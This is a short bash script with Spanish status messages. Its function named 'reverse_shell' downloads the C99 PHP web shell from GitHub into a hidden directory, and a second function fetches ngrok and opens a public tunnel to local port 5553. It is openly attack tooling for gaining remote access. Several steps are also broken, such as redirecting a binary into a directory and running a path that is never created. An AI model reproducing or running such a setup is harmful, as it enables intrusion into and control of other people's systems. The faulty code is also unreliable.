#!/bin/bash

function preparation(){
	echo "preparando lo necesario...."
	mkdir .content
}

function reverse_shell(){
	wget https://raw.githubusercontent.com/cermmik/C99-WebShell/master/c99shell.php 
	mv c99shell.php ~/.content/
}

function ngrok(){
	echo "Iniciando ngrok..."
	case `dpkg --print-architecture` in
aarch64)
    architectureURL="arm64" ;;
arm)
    architectureURL="arm" ;;
armhf)
    architectureURL="armhf" ;;
amd64)
    architectureURL="amd64" ;;
i*86)
    architectureURL="i386" ;;
x86_64)
    architectureURL="amd64" ;;
*)
    echo "Fallo..."
esac	

wget "https://github.com/tchelospy/NgrokTest/blob/master/ngrok-stable-linux-${architectureURL}.zip?raw=true" -O ngrok.zip
unzip ngrok.zip
cat ngrok > ~/.content/
chmod 755 ~/.content/
rm ngrok ngrok.zip
~/.content/ngrok http 5553
}
